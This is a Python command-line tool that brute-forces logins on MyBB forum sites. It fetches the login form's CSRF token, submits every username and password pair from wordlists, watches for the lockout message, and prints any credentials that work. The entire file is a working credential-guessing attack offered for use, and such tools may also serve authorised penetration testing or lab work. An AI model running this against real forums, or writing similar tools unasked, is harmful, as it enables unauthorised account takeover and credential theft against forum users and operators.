#!/usr/bin/env python3

# *-* coding: utf-8 *-*
# Author: @0xsysr3ll
# Date: 2022-03-11
# Description: Brute force attack against MyBB forum
# License: None
__version__ = '1.1'

import requests as req
import argparse
import pyfiglet
from termcolor import colored
from bs4 import BeautifulSoup as bs4
from progress.bar import IncrementalBar
from prettytable import PrettyTable

banner = colored(pyfiglet.figlet_format('MyBB Brute', font='slant'),
                 'blue') + colored(f'\n{__version__} by 0xsysr3ll\n', 'red')


class Bruteforce():
    def __init__(self, target: str, usernames: list, passwords: list) -> None:
        self.target, self.usernames, self.passwords = target, usernames, passwords

    def conn_test(self) -> str:
        try:
            if req.get(f'http://{self.target}').status_code == 200:
                return 'http'
            elif req.get(f'https://{self.target}').status_code == 200:
                return 'https'
        except:
            exit(f"[{colored('-','red')}] Connection to target failed")

    def run(self) -> None:
        creds = PrettyTable(['Username', 'Password'])
        print(f"[{colored('*','blue')}] Target: " + self.target)
        # Check if connection to target is possible
        scheme = self.conn_test()
        print(f"[{colored('*','blue')}] Connection to target : {colored('OK','green')}")
        url = f'{scheme}://{self.target}/member.php?action=login'
        headers = {
            'Host': f'{self.target}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'{scheme}://{self.target}',
            'Connection': 'close',
            'Referer': f'{scheme}://{self.target}/member.php?action=login',
            'Upgrade-Insecure-Requests': '1',
        }
        
        print(f"[{colored('*','blue')}] Starting brute force attack")
        

        # Get the form token
        r = req.get(url=url, headers=headers)
        cookies = r.cookies.get_dict()
        my_post_key = bs4(r.content, 'html.parser').find(
            'input', {'name': 'my_post_key'})['value']
        bar = IncrementalBar(f"[{colored('*','yellow')}] Status : ",max=(len(self.passwords)*len(self.usernames)), suffix='%(percent)d%%')
        for u in self.usernames:
            u = u.strip()
            bar.next()
            for p in self.passwords:
                p = p.strip()
                data = {
                    'username': u,
                    'password': p,
                    'remember': 'yes',
                    'submit': 'Login',
                    'action': 'do_login',
                    'url': url,
                    'my_post_key': my_post_key
                }
                r = req.post(url=url, data=data,
                                headers=headers, cookies=cookies, allow_redirects=True)
                bar.next()
                if 'now wait' in r.text:
                    # Exceeded login attempts
                    for result in bs4(r.content, 'html.parser').find_all('td', {'class': 'trow1'}):
                        if 'failed' in result.text:
                            exit(
                                f"[{colored('-','red')}] Exceeded login attempts \n{result.text}")
                                
                elif not bs4(r.content, 'html.parser').find('div', {'class': 'error'}):
                    # Credentials found
                    print(f"\n[{colored('+','green')}] Credentials found : {u}:{p}")
                    creds.add_row([u,p])
                    break
        print(f"\n\n[{colored('*','green')}] Done !\n")
        print(creds)


def parse_args(args):

    if not args.username and not args.user_file:
        exit("Error: Please specify at least a username or a usernames wordlist")
    if not args.password and not args.pass_file:
        exit("Error: Please specify at leats a password or a passwords wordlist")

    target = args.target.split(
        '//')[1] if ('http' or 'https') in args.target else args.target

    if args.user_file:
        with open(args.user_file, 'r', encoding='latin-1') as f:
            usernames = f.read().splitlines()
    else:
        usernames = [args.username]
    if args.pass_file:
        with open(args.pass_file, 'r', encoding='latin-1') as f:
            passwords = f.read().splitlines()
    else:
        passwords = [args.password]

    return target, usernames, passwords

if __name__ == "__main__":
    print(banner)

    parser = argparse.ArgumentParser(
        prog=__file__.split('/')[-1],
        description="A simple MyBB bruteforce tool"
    )
    parser.add_argument(
        '-t', '--target', help="MyBB Forum ip/domain target (without http/https), eg. 10.10.10.1:8080", required=True)
    user_group = parser.add_argument_group("Usernames")
    user_group = user_group.add_mutually_exclusive_group(required=True)
    user_group.add_argument(
        '-u', '--username', help="Username to use for bruteforce")
    user_group.add_argument('-U', '--user-file',
                            help="Usernames file to use for bruteforce")
    pass_group = parser.add_argument_group("Passwords")
    pass_group = pass_group.add_mutually_exclusive_group(required=True)
    pass_group.add_argument(
        '-p', '--password', help="Password to use for bruteforce")
    pass_group.add_argument('-P', '--pass-file',
                            help="Passwords file to use for bruteforce")

    target, usernames, passwords = parse_args(parser.parse_args())

    # Launch the attack (or not)
    bf = Bruteforce(target, usernames, passwords)
    bf.run()
